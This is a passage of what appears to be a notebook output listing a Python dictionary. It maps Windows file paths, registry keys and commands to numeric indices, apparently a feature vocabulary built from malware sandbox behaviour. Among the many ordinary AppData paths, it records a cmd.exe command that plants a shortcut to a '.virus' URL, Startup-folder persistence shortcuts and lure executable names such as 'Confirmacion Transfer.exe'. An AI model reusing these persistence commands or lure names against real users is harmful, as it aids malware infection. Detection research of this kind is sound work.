       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\fi\\\\*': 136,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\settings\\\\.git': 137,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\LocalState\\\\*': 138,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\*': 139,\n",
       " 'cmd.exe /C echo [InternetShortcut] > %temp%\\\\C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\Microsoft Edge.lnk.url && echo URL=4e1ca94cdfbdc18a65391dd3ee9c81c0.virus >> %temp%\\\\C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\Microsoft Edge.lnk.url': 140,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\SystemAppData': 141,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\el\\\\*': 142,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 143,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.549981C3F5F10_8wekyb3d8bbwe\\\\LocalCache\\\\*': 144,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\tr': 145,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Roaming\\\\Adobe\\\\*': 146,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-PAN-FW\\\\*': 147,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 148,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebpImageExtension_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 149,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\*': 150,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\TempState': 151,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\LocalCache': 152,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 153,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\lt': 154,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\TempState\\\\*': 155,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\TokenBroker\\\\*': 156,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\.git': 157,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\\\\LocalState\\\\.git': 158,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\pt_BR\\\\.git': 159,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\\\\Settings\\\\*': 160,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\hr-BA': 161,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup': 162,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\af\\\\*': 163,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\Temp': 164,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\TargetedContentCache\\\\v3\\\\88000161\\\\*': 165,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Office.OneNote_8wekyb3d8bbwe\\\\AC\\\\*': 166,\n",
       " 'C:\\\\Users\\\\christopher63\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Session Storage': 167,\n",
       " 'C:\\\\Users\\\\evan17\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-PAN-FW\\\\scripts': 168,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 169,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\AppData\\\\*': 170,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Libraries\\\\.git': 171,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\LocalLow\\\\Microsoft\\\\CryptnetUrlCache': 172,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00.UWPDesktop_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 173,\n",
       " 'C:\\\\Users\\\\carlos72\\\\AppData\\\\Local\\\\Temp\\\\C:\\\\Users\\\\user\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WINN.lnk.url:Zone.Identifier': 174,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AC\\\\*': 175,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\sk\\\\*': 176,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\te': 177,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalCache\\\\.git': 178,\n",
       " 'C:\\\\Users\\\\edward89\\\\AppData\\\\Local\\\\Temp\\\\C:\\\\Users\\\\user\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\Software Protection Service.lnk.url:Zone.Identifier': 179,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\TargetedContentCache\\\\v3\\\\88000163': 180,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\RoamingState\\\\*': 181,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\vi\\\\*': 182,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\637680406057830000\\\\2': 183,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\en_US\\\\.git': 184,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Office.OneNote_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 185,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Packages\\\\*': 186,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\fi\\\\*': 187,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\mn\\\\*': 188,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 189,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\LocalState\\\\.git': 190,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\93.0.961.52\\\\*': 191,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\AC\\\\*': 192,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\AC\\\\INetCookies': 193,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Virtualized\\\\.git': 194,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\cs\\\\.git': 195,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\LocalLow\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 196,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.CredDialogHost_cw5n1h2txyewy\\\\LocalCache': 197,\n",
       " 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{AE50C081-EBD2-438A-8655-8A092E34987A}\\\\Description': 198,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\*': 199,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\\\SystemAppData\\\\*': 200,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\pt-BR\\\\*': 201,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\ro\\\\.git': 202,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\RoamingState': 203,\n",
       " 'pdfembargodiangovcodeudapendientereferenciamora.exe': 204,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AppData\\\\.git': 205,\n",
       " 'Confirmacion Transfer.exe': 206,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 207,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\TempState\\\\.git': 208,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\images\\\\.git': 209,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\SystemAppData': 210,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\Settings': 211,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CapturePicker_cw5n1h2txyewy\\\\AppData\\\\*': 212,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\ShaderCache\\\\GPUCache': 213,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\280811': 214,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\ESE\\\\.git': 215,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\.git': 216,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\AC\\\\Microsoft': 217,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\.git': 218,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AppData\\\\*': 219,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\ta\\\\.git': 220,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\TempState\\\\*': 221,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\af\\\\*': 222,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Session Storage': 223,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\RoamingState\\\\*': 224,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\TempState\\\\.git': 225,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\LocalState\\\\*': 226,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\Settings\\\\*': 227,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\hyphen-data\\\\101.0.4906.0\\\\_metadata\\\\.git': 228,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\platforms\\\\.git': 229,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\Settings': 230,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-CM\\\\.git': 231,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\RoamingState\\\\*': 232,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 233,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\LocalCache\\\\Local': 234,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\zh_TW\\\\*': 235,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\no': 236,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\sv\\\\.git': 237,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\Settings': 238,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\TempState\\\\*': 239,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sk\\\\.git': 240,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 241,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\Settings\\\\*': 242,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\it\\\\*': 243,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\kk': 244,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-SV\\\\.git': 245,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extension Scripts': 246,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\ca\\\\*': 247,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\et': 248,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\eu\\\\.git': 249,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\LocalState\\\\.git': 250,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 251,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy\\\\RoamingState': 252,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{f3ce0f7c-4901-4acc-8648-d5d44b04ef8f}\\\\StreamResourceType': 253,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\nxlog\\\\*': 254,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\RoamingState\\\\.git': 255,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\ListSync\\\\Business1\\\\*': 256,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\Settings': 257,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\qml\\\\QtQuick\\\\Templates.2\\\\.git': 258,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\kn\\\\.git': 259,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\AppData': 260,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\CapabilityAccessManager\\\\ConsentStore\\\\microphone\\\\NonPackaged\\\\348f2713fba8f0543600bf38c8427eb9996769654987516e3f0202f7bcf17228.sample\\\\LastUsedTimeStart': 261,\n",
       " 'C:\\\\Users\\\\nsilva\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\images\\\\.git': 262,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Sync Data': 263,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 264,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\onesettings_waas_featuremanagement\\\\*': 265,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\EdgeCoupons': 266,\n",
       " 'C:\\\\Users\\\\inguyen\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-CR': 267,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\pt_PT\\\\*': 268,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\it': 269,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebpImageExtension_8wekyb3d8bbwe\\\\Settings': 270,\n",
       " 'C:\\\\Users\\\\christopher63\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebpImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 271,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extension Scripts\\\\.git': 272,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy\\\\AC\\\\Temp': 273,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 274,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 275,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\FirstPartySetsPreloaded\\\\*': 276,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\af\\\\.git': 277,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 278,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Crowd Deny\\\\*': 279,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\.git': 280,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\LocalCache\\\\*': 281,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Publishers\\\\8wekyb3d8bbwe\\\\Fonts': 282,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\OneDrive\\\\cache\\\\*': 283,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\BackgroundTransferApiGroup\\\\.git': 284,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 285,\n",
